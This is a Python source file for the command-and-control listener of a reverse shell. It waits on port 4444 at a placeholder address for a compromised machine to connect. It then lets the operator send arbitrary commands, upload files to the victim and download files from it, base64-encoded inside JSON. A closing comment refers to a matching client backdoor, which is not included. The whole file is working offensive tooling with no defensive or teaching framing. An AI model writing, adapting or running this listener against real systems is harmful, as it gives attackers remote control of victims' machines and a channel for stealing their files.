import socket
import json
import base64
def run_listener(ip, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    listener.bind((ip, port))
    listener.listen(1)
    print("[+] Waiting for connections..")
    connection, address = listener.accept()
    print(f"[+] Got a connection from {str(address)}!!")
    while True:
        try:
            command = input(">> ")
        except KeyboardInterrupt:
            connection.sendall("exit".encode())
            print("\n[-] Exiting with Ctrl+C next time use exit...\n")
            connection.close()
            exit()
        command = command.split(" ")
        if command[0].lower() == "upload":
            file_path = command[1]
            file_content_byte = read_file(file_path)  # in byte
            file_content = file_content_byte.decode() #bin->str
            command.append(file_content)
        if command[0].lower() == "exit":
            connection.sendall(str(command).encode())
            print("\n[-] Exiting....\n")
            connection.close()
            exit()
        reliable_send(connection, command)
        command_result = reliable_receive(connection)

        if command[0].lower() == "download":
            if command_result == "[-] File not found":
                command_result = "\n[-] File not found\n"
            else:

                command_result = write_file(command[1], command_result)
        print(command_result)  # prints the command_result

def write_file(path, content):
    with open(path,"wb") as file:
        file.write(base64.b64decode(content)) # decoding base64 cause we encoded while sending
        return "\n[+] Download successful\n"

def read_file(path):
    try:
        with open(path,"rb") as file:
            return base64.b64encode(file.read()) # encoding for all beacause can't read .jpeg/jpg file without it
    except FileNotFoundError:
        return b"[-] File not found"
    except Exception as e:
        print(e)

def reliable_send(connection, data):
    json_data = json.dumps(data) #convert data(str) into json_obj
    try:
        connection.sendall(json_data.encode()) # converts json_obj -> byte and send
    except Exception as e:
        print(e)

def reliable_receive(connection):
    # has to do this because if data is more than 1024 byte then it throws error but now it concat and show
    json_data = ""
    while True:
        try:
            chunk = connection.recv(8192).decode() # receive byte then convert byte->json_obj
            if not chunk:
                break
            json_data +=chunk
            return json.loads(json_data) #unpack json obj to string
        except json.decoder.JSONDecodeError:
            continue

run_listener("LISTENER_IP", 4444) #4444 -> IS PORT TO LISTEN ON. YOU CAN CUSTOMIZE AS YOUR PREFERENCE USE THE SAME IN BOTH CODE
